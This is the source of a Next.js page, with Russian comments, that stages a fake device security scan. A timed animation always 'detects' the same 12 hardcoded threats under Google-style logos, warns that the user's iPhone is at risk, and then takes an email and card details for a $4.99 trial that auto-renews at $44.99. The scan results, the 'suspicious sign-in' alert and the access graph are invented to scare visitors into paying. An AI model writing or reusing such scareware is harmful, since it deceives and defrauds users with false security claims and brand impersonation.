'use client'

import { useState, useEffect, useRef } from 'react'
import Script from 'next/script'

// ==========================
// Глобальные типы для SDK
// ==========================
declare global {
	interface Window {
		truegateSdk: any
	}
}

// ==========================
// Утилиты для работы с Cookies
// ==========================
function setCookie(name: string, value: string, days: number = 30) {
	const date = new Date()
	date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000)
	const expires = 'expires=' + date.toUTCString()
	document.cookie =
		name + '=' + encodeURIComponent(value) + ';' + expires + ';path=/'
}

function getCookie(name: string): string | null {
	const nameEQ = name + '='
	const ca = document.cookie.split(';')
	for (let i = 0; i < ca.length; i++) {
		let c = ca[i].trim()
		if (c.indexOf(nameEQ) === 0)
			return decodeURIComponent(c.substring(nameEQ.length, c.length))
	}
	return null
}

export default function SpecialPage() {
	// ==========================================
	// СОСТОЯНИЯ (STATE)
	// ==========================================

	// Фазы и анимация
	const [phase, setPhase] = useState<'scan' | 'results'>('scan')
	const [progress, setProgress] = useState(0)
	const [visibleItems, setVisibleItems] = useState(0)
	const [showBanner, setShowBanner] = useState(false)

	// Попап и оплата
	const [isModalOpen, setIsModalOpen] = useState(false)
	const [email, setEmail] = useState('')
	const [isEmailDisabled, setIsEmailDisabled] = useState(false)

	// Оверлей загрузки
	const [isOverlayVisible, setIsOverlayVisible] = useState(true)
	const [overlayMsg, setOverlayMsg] = useState({
		text: 'Enter your email above to unlock secure payment',
		type: 'info',
	})

	// Ошибки и кнопки
	const [errorMsg, setErrorMsg] = useState('')
	const [isSuccess, setIsSuccess] = useState(false)
	const [payBtnText, setPayBtnText] = useState('PAY')
	const [isPayDisabled, setIsPayDisabled] = useState(true)

	// ==========================================
	// РЕФЫ (REFS)
	// ==========================================
	const clickIdRef = useRef<string>('')
	const sdkInitRef = useRef(false)
	const submitCardRef = useRef<any>(null)
	const typingTimerRef = useRef<NodeJS.Timeout | null>(null)
	const currentEmailRef = useRef<string | null>(null)
	const isFetchingWidgetRef = useRef(false)

	// Константы из вашего JS
	const API_BASE = 'https://wa-adminn.com'
	const PLAN_CODE = 'trial_month'

	const scanItemsText = [
		'Unauthorized access',
		'Phishing attacks',
		'Data leak',
		'Application vulnerabilities',
		'Network spoofing',
		'Malware and spyware',
		'Device jailbreak',
		'Suspicious configuration profiles',
		'Unsafe app permissions',
		'Connection to untrusted Wi-Fi networks',
		'Outdated system components',
		'Risk of personal data interception',
	]

	// ==========================================
	// ЭФФЕКТ 1: Инициализация (ClickID + сохраненный Email)
	// ==========================================
	useEffect(() => {
		const urlParams = new URLSearchParams(window.location.search)
		let cid =
			urlParams.get('clickid') ||
			urlParams.get('clk_id') ||
			urlParams.get('click_id') ||
			''

		if (cid) {
			localStorage.setItem('clickid', cid)
			setCookie('clickid', cid, 30)
		} else {
			cid = localStorage.getItem('clickid') || getCookie('clickid') || ''
		}
		clickIdRef.current = cid

		const savedEmail = sessionStorage.getItem('userEmail')
		if (savedEmail) {
			setEmail(savedEmail)
			setIsEmailDisabled(true)
			currentEmailRef.current = savedEmail
			preparePayment(savedEmail, false)
		}
	}, [])

	// ==========================================
	// ЭФФЕКТ 2: Логика сканирования
	// ==========================================
	useEffect(() => {
		if (phase !== 'scan') return

		// Запускаем заполнение прогресс бара через 300мс
		const progTimer = setTimeout(() => setProgress(100), 300)

		// Поочередно показываем элементы списка (2500ms на все)
		const intervalTime = 2500 / scanItemsText.length
		let currentItem = 0
		const revealInterval = setInterval(() => {
			currentItem++
			setVisibleItems(currentItem)
			if (currentItem >= scanItemsText.length) clearInterval(revealInterval)
		}, intervalTime)

		// Прячем прогресс бар и показываем баннер (2800ms)
		const bannerTimer = setTimeout(() => setShowBanner(true), 2800)

		// Переключаем на страницу результатов (4300ms)
		const phaseTimer = setTimeout(() => setPhase('results'), 4300)

		return () => {
			clearTimeout(progTimer)
			clearInterval(revealInterval)
			clearTimeout(bannerTimer)
			clearTimeout(phaseTimer)
		}
	}, [phase])

	// ==========================================
	// УТИЛИТЫ
	// ==========================================
	const validateEmail = (val: string) =>
		/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(val)
	const extractUsername = (val: string) => {
		const atIndex = val.indexOf('@')
		if (atIndex === -1) return val
		return val.substring(0, atIndex)
	}

	const showOverlayError = (message: string) => {
		setOverlayMsg({ text: message, type: 'error' })
		setIsOverlayVisible(true)
	}

	const showOverlayLoading = (message: string) => {
		setOverlayMsg({ text: message, type: 'loading' })
		setIsOverlayVisible(true)
	}

	const resetPayButton = () => {
		setIsPayDisabled(false)
		setPayBtnText('PAY')
	}

	// Обработка ввода Email
	const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		let val = e.target.value
		val = val.replace(/[А-Яа-яЁё]/g, '').replace(/[^A-Za-z0-9@._%+-]/g, '')
		setEmail(val)

		if (!validateEmail(val)) {
			setIsOverlayVisible(true)
			setOverlayMsg({
				text: 'Enter your email above to unlock secure payment',
				type: 'info',
			})
			setIsPayDisabled(true)
		}

		if (typingTimerRef.current) clearTimeout(typingTimerRef.current)

		if (validateEmail(val) && val !== currentEmailRef.current) {
			typingTimerRef.current = setTimeout(() => {
				preparePayment(val, true)
			}, 400)
		}
	}

	// Обработка кнопок доменов
	const handleDomainClick = (domain: string) => {
		const username = extractUsername(email.trim())
		if (!username) return

		const newEmail = username + domain
		setEmail(newEmail)

		if (newEmail !== currentEmailRef.current && validateEmail(newEmail)) {
			preparePayment(newEmail, true)
		}
	}

	// ==========================================
	// ИНИЦИАЛИЗАЦИЯ ПЛАТЕЖА И SDK
	// ==========================================
	const preparePayment = async (
		emailValue: string,
		isNewUser: boolean = false,
	) => {
		if (isFetchingWidgetRef.current) return
		if (sdkInitRef.current && emailValue === currentEmailRef.current) return

		isFetchingWidgetRef.current = true
		showOverlayLoading('Securing payment connection...')
		setIsPayDisabled(true)

		if (sdkInitRef.current && emailValue !== currentEmailRef.current) {
			sdkInitRef.current = false
			submitCardRef.current = null
		}

		try {
			let tgUserId = localStorage.getItem('tg_user_id') || null

			// ШАГ 1: Регистрация
			if (isNewUser) {
				showOverlayLoading('Registering your account...')
				const regRes = await fetch(`${API_BASE}/api/v1/register/`, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						email: emailValue,
						subscription_type_code: PLAN_CODE,
						click_id: clickIdRef.current,
						clickid: clickIdRef.current,
					}),
				})
				const regData = await regRes.json()
				if (!regRes.ok)
					throw new Error(
						regData.detail ||
							regData.message ||
							'Registration failed. Please try again.',
					)

				sessionStorage.setItem('userEmail', emailValue)
				if (regData.truegate_external_user_id) {
					tgUserId = regData.truegate_external_user_id
					localStorage.setItem('tg_user_id', tgUserId)
				}
			}

			// ШАГ 2: Виджет
			showOverlayLoading('Loading secure payment form...')
			const widgetBody: any = {
				subscription_type_code: PLAN_CODE,
				email: emailValue,
			}
			if (tgUserId) widgetBody.truegate_external_user_id = tgUserId

			const response = await fetch(
				`${API_BASE}/api/v1/subscription-payment-widget/`,
				{
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify(widgetBody),
				},
			)

			const data = await response.json()
			if (!response.ok)
				throw new Error(
					data.detail || data.message || 'Failed to load payment widget.',
				)
			if (!data.payment_widget || !data.payment_widget.transactionId)
				throw new Error('Payment service temporarily unavailable.')

			currentEmailRef.current = emailValue
			await initTruegateSDK(data.payment_widget.transactionId)
		} catch (error: any) {
			showOverlayError(error.message)
		} finally {
			isFetchingWidgetRef.current = false
		}
	}

	const initTruegateSDK = async (transactionId: string) => {
		if (sdkInitRef.current) return

		await new Promise<void>(resolve => {
			if (window.truegateSdk) resolve()
			else {
				window.addEventListener('message', e => {
					if (e.data && e.data.type === 'SDK_READY') resolve()
				})
			}
		})

		const sdkInstance = new window.truegateSdk({
			id: 'payment-instance',
			transactionId: transactionId,
			env: 'PROD',
		})

		sdkInstance.on('PAYMENT_STATUS', (payload: any) => {
			if (payload.details.status === 'SUCCESS') {
				setIsSuccess(true)
				setErrorMsg('🎉 Payment successful! Redirecting...')
				setTimeout(() => {
					window.location.href = './thankyou' + window.location.search
				}, 1500)
			} else if (payload.details.status === 'FAILED') {
				setErrorMsg('Payment declined by your bank. Try another card.')
				resetPayButton()
			}
		})

		sdkInstance.on('PAYMENT_ERROR', () => {
			setErrorMsg('Error processing payment. Please check card details.')
			resetPayButton()
		})

		await sdkInstance.init()
		sdkInitRef.current = true

		try {
			// Очистка перед вставкой
			const numEl = document.getElementById('card-number')
			const expEl = document.getElementById('card-expiration')
			const cvvEl = document.getElementById('card-cvv')
			if (numEl) numEl.innerHTML = ''
			if (expEl) expEl.innerHTML = ''
			if (cvvEl) cvvEl.innerHTML = ''

			const result = await sdkInstance.initCardPayment({
				cardNumberId: 'card-number',
				expirationId: 'card-expiration',
				securityCodeId: 'card-cvv',
				options: {
					FONT_NAME: 'system-ui, -apple-system, sans-serif',
					FONT_SIZE: '16px',
					COLOR: '#111827',
					PLACEHOLDER_COLOR: '#9ca3af',
					PLACEHOLDER_CARD_NUMBER: '0000 0000 0000 0000',
					PLACEHOLDER_EXPIRATION: 'MM / YY',
					PLACEHOLDER_SECURITY_CODE: 'CVC',
				},
			})

			submitCardRef.current = result.submit
			setIsOverlayVisible(false)
			setIsPayDisabled(false)
			setIsEmailDisabled(true)
		} catch (err) {
			console.error('initCardPayment error:', err)
			showOverlayError(
				'Failed to initialize card fields. Please refresh the page.',
			)
		}
	}

	const handlePaymentSubmit = async () => {
		if (!submitCardRef.current) return
		setErrorMsg('')
		setIsPayDisabled(true)
		setPayBtnText('Processing...')

		try {
			await submitCardRef.current({ cardHolderName: 'Card Holder' })
		} catch (error) {
			setErrorMsg('Please fill in all card details correctly.')
			resetPayButton()
		}
	}

	return (
		<>
			<Script
				src='https://sdk.truegate.tech/sdk.js'
				strategy='afterInteractive'
			/>

			{/* ================= СТИЛИ (Содержат фикс от двойных полей) ================= */}
			<style
				dangerouslySetInnerHTML={{
					__html: `
				.secure-overlay {
					position: absolute; top: 0; left: 0; right: 0; bottom: 0;
					background: rgba(255, 255, 255, 0.95);
					z-index: 10; display: flex; flex-direction: column;
					align-items: center; justify-content: center; text-align: center;
					padding: 20px; border-radius: 8px; transition: opacity 0.3s;
				}
				.secure-overlay.hidden { opacity: 0; pointer-events: none; }
				
				.relative-container { position: relative; min-height: 250px; }
				
				div.custom-input {
					height: 48px; background: #ffffff; border: 1px solid #cbd5e1;
					border-radius: 6px; padding: 0 16px; display: flex; align-items: center;
					width: 100%; box-sizing: border-box; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
					overflow: hidden;
				}
				
				div.custom-input iframe {
					display: block !important;
					width: 100% !important; height: 100% !important;
					border: none !important; outline: none !important; background: transparent !important;
					margin: 0 !important; padding: 0 !important;
				}

				/* 🔴🔴🔴 ЖЕСТКИЙ ФИКС ОТ ДУБЛИРОВАНИЙ 🔴🔴🔴 */
				div.custom-input iframe:nth-of-type(n+2) {
					display: none !important;
				}

				.domain-row {
					display: flex; gap: 8px; justify-content: center; 
					margin-bottom: 25px; margin-top: 10px; flex-wrap: wrap;
				}
				.domain-btn {
					background: #f1f5f9; border: 1px solid #cbd5e1; color: #334155;
					border-radius: 6px; padding: 8px 12px; font-size: 14px; font-weight: 500;
					cursor: pointer; transition: background 0.2s, transform 0.1s;
				}
				.domain-btn:hover { background: #e2e8f0; }
				.domain-btn:active { transform: scale(0.97); }

				.scan-popup__close {
					position: absolute; top: 15px; right: 15px; background: transparent;
					border: none; cursor: pointer; width: 24px; height: 24px; padding: 0;
					display: flex; align-items: center; justify-content: center; z-index: 20;
				}
				.scan-popup__close svg { width: 24px; height: 24px; stroke: #333; }
				.scan-popup__content { position: relative; }

				.scan-popup { display: none; }
				.scan-popup.active { display: flex; }
				
				.scan-item { display: none; }
				.scan-item.visible { display: flex; }
			`,
				}}
			/>

			<div className='app-container'>
				{/* ФАЗА 1: СКАНИРОВАНИЕ */}
				{phase === 'scan' && (
					<div id='scan-page'>
						<div className='google-logo-wrapper'>
							<svg width='30' height='30' viewBox='0 0 24 24'>
								<path
									fill='#4285F4'
									d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z'
								/>
								<path
									fill='#34A853'
									d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z'
								/>
								<path
									fill='#FBBC05'
									d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z'
								/>
								<path
									fill='#EA4335'
									d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z'
								/>
							</svg>
						</div>

						<div className='scan-title'>
							DEVICE SCAN
							<br />
							FOR POTENTIAL THREATS
						</div>

						<div className='progress-section'>
							{!showBanner && (
								<div className='progress-bar-bg' id='progressBar'>
									<div
										className='progress-bar-fill'
										style={{
											width: `${progress}%`,
											transition: 'width 2.5s linear',
										}}
									></div>
								</div>
							)}

							{showBanner && (
								<div
									className='detected-banner'
									id='detectedBanner'
									style={{ display: 'flex' }}
								>
									<div className='banner-left'>
										<img src='/img/detected-ic.svg' alt='detected' />
										<div>
											<div className='banner-text-top'>DETECTED ISSUES</div>
											<div className='banner-text-bottom'>
												12 security risks found
											</div>
										</div>
									</div>
									<div className='banner-number'>12</div>
								</div>
							)}
						</div>

						<div className='scan-list'>
							{scanItemsText.map((text, idx) => (
								<div
									key={idx}
									className={`scan-item ${idx < visibleItems ? 'visible' : ''}`}
								>
									<div className='scan-item-left'>
										<img src='/img/treug-warn.svg' alt='warn' />
										{text}
									</div>
									<div className='scan-item-right'>detected</div>
								</div>
							))}
						</div>
					</div>
				)}

				{/* ФАЗА 2: РЕЗУЛЬТАТЫ */}
				{phase === 'results' && (
					<div id='results-page'>
						<div className='results-content'>
							<div className='card card-main-alert'>
								<div style={{ display: 'flex', justifyContent: 'center' }}>
									<svg width='32' height='32' viewBox='0 0 24 24'>
										<path
											fill='#4285F4'
											d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z'
										/>
										<path
											fill='#34A853'
											d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z'
										/>
										<path
											fill='#FBBC05'
											d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z'
										/>
										<path
											fill='#EA4335'
											d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z'
										/>
									</svg>
								</div>
								<div className='grey-subtitle'>Threats detected</div>
								<div className='red-title-big'>12 SECURITY ISSUES FOUND</div>
								<p className='desc-text'>
									We've detected potential security risks on your device. Review
									the issues below and take action to keep your data safe.
								</p>
							</div>

							<div className='card card-row' style={{ padding: '10px 16px' }}>
								<div className='card-row-left'>
									<img src='/img/google-setting.svg' alt='setting' />
									Suspicious sign-in
									<br />
									activity detected
								</div>
								<button className='btn-outline-red'>FOUND</button>
							</div>

							<div className='section-title'>
								<span>CRITICAL ACCESS ACTIVITY</span>
								<br />
								DETECTED
							</div>
							<div className='section-subtitle'>
								Suspicious <span>attempts to access your personal</span> data
								have been recorded over the past 7 days.
							</div>

							<div className='graph'>
								<img src='/img/graphgoogle.svg' alt='graph' />
							</div>

							<button
								className='btn-main-blue'
								onClick={() => setIsModalOpen(true)}
							>
								GET SCAN RESULTS
							</button>

							<div className='grid-2'>
								<div className='issue-card'>
									<div className='icon-circle'>
										<img src='/img/iss-ic1.svg' alt='icon' />
									</div>
									<button className='btn-outline-red'>ISSUE</button>
									<h4>Passwords</h4>
									<p>Possible Fraud Attempts</p>
								</div>

								<div className='issue-card'>
									<img src='/img/iss-ic2.svg' alt='icon' />
									<button className='btn-outline-red'>ISSUE</button>
									<h4>Photos</h4>
									<p>Possible Fraud Attempts</p>
								</div>
							</div>

							<div className='footer'>
								<a href='/policy' target='_blank' className='privacy-link'>
									PRIVACY POLICY
								</a>
								<div className='copyright'>© 2026. All rights reserved.</div>
							</div>
						</div>
					</div>
				)}

				{/* МОДАЛЬНОЕ ОКНО С ОПЛАТОЙ (POPUP) */}
				<div
					id='scanPopup'
					className={`scan-popup ${isModalOpen ? 'active' : ''}`}
					onClick={e => {
						if ((e.target as HTMLElement).id === 'scanPopup')
							setIsModalOpen(false)
					}}
				>
					<div className='scan-popup__content'>
						<button
							className='scan-popup__close'
							onClick={() => setIsModalOpen(false)}
						>
							<svg
								viewBox='0 0 24 24'
								fill='none'
								strokeWidth='2'
								strokeLinecap='round'
								strokeLinejoin='round'
							>
								<line x1='18' y1='6' x2='6' y2='18'></line>
								<line x1='6' y1='6' x2='18' y2='18'></line>
							</svg>
						</button>

						<img src='/img/set-pop.svg' alt='setpop' />

						<h2 className='scan-popup__title'>
							URGENT: <span>YOUR IPHONE MAY BE AT RISK</span>
						</h2>

						<div className='payment-container' id='payment-form'>
							{/* Поле email */}
							<div className='input-group' style={{ marginBottom: '10px' }}>
								
								<input
									type='email'
									className='custom-input'
									placeholder='your@email.com'
									style={{ borderColor: '#007bff' }}
									value={email}
									onChange={handleEmailChange}
									disabled={isEmailDisabled}
									required
								/>
							</div>

							{/* Кнопки доменов */}
							{!isEmailDisabled && (
								<div className='domain-row'>
									<button
										type='button'
										className='domain-btn'
										onClick={() => handleDomainClick('@gmail.com')}
									>
										@gmail.com
									</button>
									<button
										type='button'
										className='domain-btn'
										onClick={() => handleDomainClick('@yahoo.com')}
									>
										@yahoo.com
									</button>
									<button
										type='button'
										className='domain-btn'
										onClick={() => handleDomainClick('@hotmail.com')}
									>
										@hotmail.com
									</button>
								</div>
							)}

							<div className='relative-container'>
								{/* Оверлей блокировки */}
								<div
									className={`secure-overlay ${!isOverlayVisible ? 'hidden' : ''}`}
								>
									<p
										style={{
											fontWeight: 600,
											color: '#333',
											marginBottom: '10px',
											fontSize: '16px',
										}}
									>
										{overlayMsg.type === 'loading'
											? 'Processing...'
											: 'Enter your email above to unlock secure payment'}
									</p>
									<span
										style={{
											color:
												overlayMsg.type === 'error'
													? '#e53e3e'
													: overlayMsg.type === 'loading'
														? '#007bff'
														: '#666',
											fontSize: '14px',
											fontWeight: overlayMsg.type === 'error' ? 500 : 400,
										}}
									>
										{overlayMsg.text}
									</span>
								</div>

								<div className='input-group'>
									
									<div id='card-number' className='custom-input'></div>
								</div>

								<div
									className='row-50-50'
									style={{
										display: 'flex',
										gap: '16px',
										margin: '16px 0 24px',
									}}
								>
									<div className='input-group' style={{ flex: 1 }}>
										
										<div id='card-expiration' className='custom-input'></div>
									</div>
									<div className='input-group' style={{ flex: 1 }}>
										
										<div id='card-cvv' className='custom-input'></div>
									</div>
								</div>

								{errorMsg && (
									<div
										role='alert'
										style={{
											color: isSuccess ? '#10B981' : '#e53e3e',
											marginBottom: '15px',
											fontSize: '14px',
											textAlign: 'center',
											fontWeight: 'bold',
										}}
									>
										{errorMsg}
									</div>
								)}

								<button
									id='submit-button'
									className='btn-green-pay'
									disabled={isPayDisabled}
									onClick={handlePaymentSubmit}
									style={{
										opacity: isPayDisabled ? 0.5 : 1,
										transition: '0.2s',
										width: '100%',
									}}
								>
									{payBtnText === 'PAY' && (
										<img
											src='/img/paygreen.svg'
											alt='pay'
											style={{ marginRight: '8px' }}
										/>
									)}
									{payBtnText}
								</button>
							</div>
						</div>

						<div className='guarantee-section'>
							<div className='guarantee-box'>
								<div className='guarantee-header'>
									<h3 className='guarantee-title'>100% Money-Back Guarantee</h3>
								</div>
								<p className='guarantee-desc'>
									We take pride in the reliability and effectiveness — thousands
									of users worldwide trust us to protect their devices and
									personal data every day. If you've experienced technical
									issues, we're committed to making it right — including
									offering a full refund.
								</p>
							</div>
							<div className='disclaimer-text'>
								You will be automatically charged $4.99 for a 3-day trial. The
								subscription will then be auto-renewed after 4 days at the full
								price of $44.99. Payments are charged in USD. To learn more,
								visit our Terms of Use or Privacy Policy.
							</div>
						</div>
					</div>
				</div>
			</div>
		</>
	)
}
